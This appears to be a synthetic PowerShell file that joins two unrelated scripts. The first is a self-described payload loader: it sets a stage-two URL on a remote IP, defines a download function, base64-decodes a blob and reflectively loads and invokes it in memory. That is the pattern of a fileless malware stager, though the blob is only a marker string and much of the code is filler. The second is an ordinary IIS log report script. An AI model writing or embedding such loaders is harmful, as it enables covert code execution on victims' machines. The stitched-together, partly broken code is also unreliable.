<#
.SYNOPSIS
    Managed assembly acquisition and reflection workflow.

.DESCRIPTION
    Downloads or decodes a managed payload stage, loads it into the
    current AppDomain, then looks for a conventional entry method
    and invokes it only when present.

.NOTES
    The loader expects a managed payload stage.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [string]$Stage2Url = "http://198.51.100.83/payload.bin",
    [string]$StageLog = "$env:TEMP\telemetry.json",
    [int]$TimeoutSec = 71
)
$ErrorActionPreference = "Stop"

# Acquisition
function Get-StageAssemblyBytes {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [int]$TimeoutSec = 71
    )

    Write-Verbose ("Downloading assembly bytes from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadData($SourceUrl)
}

# Reflection
function Invoke-AssemblyEntryPoint {
    param(
        [object]$LoadedAssembly = $null
    )

    if ($null -eq $LoadedAssembly) {
        throw "Loaded assembly is null"
    }
    $Types = $LoadedAssembly.GetTypes()
    if ($Types.Length -gt 0) {
        $EntryMethod = $Types[0].GetMethod("Run")
        if ($null -ne $EntryMethod) {
            Write-Verbose "Invoking entry method"
            return $EntryMethod.Invoke($null, @())
        }
    }
    Write-Verbose "No conventional entry method found"
    return $null
}

Write-Verbose "Starting managed loader"
$PayloadBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpibmNsb3NlMHR2")
Write-Verbose ("Assembly byte count: " + $PayloadBytes.Length)
$ResultObject = [Reflection.Assembly]::Load($PayloadBytes)
$EntryResult = Invoke-AssemblyEntryPoint -LoadedAssembly $ResultObject
Write-Verbose ("Entry result: " + $EntryResult)

$AssemblyReport = [ordered]@{
    Stage = "reflection"
    ByteCount = $PayloadBytes.Length
    Endpoint = $Stage2Url
}
$AssemblyReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $StageLog -Append
Write-Verbose "Reading configuration values"
Write-Verbose "Retry budget remaining"
Write-Verbose "Operation completed"
Write-Verbose "Preparing working directory"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Collecting host metadata"
Write-Verbose "Resolving configured target"
Write-Verbose "Exporting operation report"
Write-Verbose "Starting workflow"
Write-Verbose "Checking local path"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
#Requires -Version 5.1
<#
.SYNOPSIS
    Parses IIS W3C logs and reports the busiest URLs and status codes.
.DESCRIPTION
    Reads the newest log files below the configured site folder, discovers the
    field order from the #Fields header and aggregates requests, errors and
    transferred bytes.
    The output is a CSV file that can be opened in Excel or forwarded to the web
    operations mailbox.
.PARAMETER LogRoot
    Used when the script runs unattended.
.PARAMETER Days
    Defaults to the value configured for this host.
.EXAMPLE
    .\Invoke-IisLogReport.ps1 -Days 14 -TopN 20
.NOTES
    Author: J. Weber
    Last updated: 2026-02-03
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$LogRoot = 'D:\Logs\iis\W3SVC2',
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 90)]
    [int]$Days = 14,

    [int]$TopN = 20,
    [string]$OutputPath = "C:\Logs\reports\iis-top-2026-05-26.csv",
    [string]$HtmlPath = 'D:\Ops\reports\iis-2026-05-26.html'
)

$ErrorActionPreference = "Stop"
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

$cutoff = (Get-Date).AddDays(-$Days)
$logFiles = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
if (@($logFiles).Count -eq 0) {
    throw ("No IIS logs found in {0} for the last {1} days" -f $LogRoot, $Days)
}

$entries = foreach ($log in $logFiles) {
    $fieldLine = Get-Content -LiteralPath $log.FullName -TotalCount 20 |
        Where-Object { $_ -match '^#Fields:' } | Select-Object -First 1
    if (-not $fieldLine) {
        Write-Verbose ("Skipping {0}: no field header" -f $log.Name)
        continue
    }
    $columns = ($fieldLine -replace '^#Fields:\s*', '') -split ' '
    $statusIndex = [array]::IndexOf($columns, 'sc-status')
    $uriIndex = [array]::IndexOf($columns, 'cs-uri-stem')
    $methodIndex = [array]::IndexOf($columns, 'cs-method')
    $bytesIndex = [array]::IndexOf($columns, 'sc-bytes')
    $timeIndex = [array]::IndexOf($columns, 'time-taken')
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        if ($parts.Count -lt $columns.Count) {
            return
        }
        [pscustomobject]@{
            Date      = $parts[0]
            Time      = $parts[1]
            Method    = $parts[$methodIndex]
            Uri       = $parts[$uriIndex]
            Status    = [int]$parts[$statusIndex]
            Bytes     = [int]$parts[$bytesIndex]
            TimeTaken = [int]$parts[$timeIndex]
        }
    }
}

$totalRequests = @($entries).Count
$errorEntries = $entries | Where-Object { $_.Status -ge 400 }
$totalMB = [math]::Round((($entries | Measure-Object -Property Bytes -Sum).Sum) / 1MB, 2)
$topUrls = $entries |
    Group-Object -Property Uri |
    Sort-Object -Property Count -Descending |
    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
$byStatus = $entries |
    Group-Object -Property Status |
    Sort-Object -Property Count -Descending |
    Select-Object -Property @{Name = 'Status'; Expression = { $_.Name }}, Count

$topUrls | Export-Csv -NoTypeInformation -Path $OutputPath -Encoding UTF8

Write-Host ("Requests: {0} | Errors: {1} | Traffic: {2} MB" -f $totalRequests, @($errorEntries).Count, $totalMB) -ForegroundColor Cyan
$byStatus | Format-Table -AutoSize
